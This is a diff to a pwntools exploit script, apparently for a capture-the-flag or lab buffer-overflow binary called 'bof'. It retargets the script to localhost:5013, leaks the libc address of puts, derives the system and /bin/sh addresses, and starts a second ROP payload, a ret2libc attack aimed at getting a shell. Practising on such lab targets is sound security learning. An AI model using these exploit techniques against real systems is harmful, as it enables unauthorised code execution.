@@ -1,6 +1,7 @@
 from pwn import *
 
-r = process("./bof")
+# r = process("./bof")
+r = remote("localhost", 5013)
 pause()
 
 VULN = 0x0000000000400537
@@ -24,15 +25,13 @@ r.sendline(PAYLOAD)
 
 r.recvline()
 PUTS_LIBC = u64(r.recvline()[:-1].ljust(8, b"\x00"))
-info("PUTS@LIBC:" + hex(PUTS_LIBC))
+info(f"PUTS@LIBC: {hex(PUTS_LIBC)}")
 LIBC_BASE = PUTS_LIBC - PUTS_OFFSET
-info("LIBC_BASE: " + hex(LIBC_BASE))
+info(f"LIBC_BASE: {hex(LIBC_BASE)}")
 SYSTEM_LIBC = LIBC_BASE + SYSTEM_OFFSET
-info("SYSTEM@LIBC: " + hex(SYSTEM_LIBC))
+info(f"SYSTEM@LIBC: {hex(SYSTEM_LIBC)}")
 BINSH_LIBC = LIBC_BASE + BINSH_OFFSET
-info("BINSH@LIBC: " + hex(BINSH_LIBC))
-
-pause()
+info(f"BINSH@LIBC: {hex(BINSH_LIBC)}")
 
 PAYLOAD2 = b"A" * 40
 PAYLOAD2 += p64(RET)
